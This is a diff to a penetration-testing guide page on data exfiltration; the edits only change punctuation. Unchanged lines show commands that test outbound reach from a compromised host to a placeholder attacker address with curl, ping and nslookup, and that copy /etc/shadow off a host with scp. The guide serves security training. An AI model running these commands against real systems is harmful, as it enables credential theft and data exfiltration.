@@ -1,6 +1,6 @@
 # Data Exfiltration
 
-Data exfiltration covers moving files and loot off a compromised host to your attacker machine. The technique depends on what the target allows outbound — HTTP/S works almost everywhere, but DNS and ICMP-based exfil are fallbacks when everything else is filtered.
+Data exfiltration covers moving files and loot off a compromised host to your attacker machine. The technique depends on what the target allows outbound. HTTP/S works almost everywhere, but DNS and ICMP-based exfil are fallbacks when everything else is filtered.
 
 ---
 
@@ -11,7 +11,7 @@ Data exfiltration covers moving files and loot off a compromised host to your at
 Before committing to a transfer method, confirm what's allowed outbound from the target:
 
 ```bash
-# From target — can it reach you?
+# From target - can it reach you?
 curl http://<attacker-ip>/test
 ping -c 1 <attacker-ip>
 nslookup <attacker-ip>
@@ -92,4 +92,4 @@ scp root@10.10.10.10:/etc/shadow /tmp/shadow
 See [Secure Transfers](secure-transfers.md) for encrypted channels and covert exfiltration techniques.
 
 !!! tip "Real-world"
-    On real engagements, avoid exfiltrating actual client data unless explicitly required to demonstrate impact. Screenshot directory listings or hash files to prove access — exfiltrating real data creates legal and compliance risk.
+    On real engagements, avoid exfiltrating actual client data unless explicitly required to demonstrate impact. Screenshot directory listings or hash files to prove access, exfiltrating real data creates legal and compliance risk.
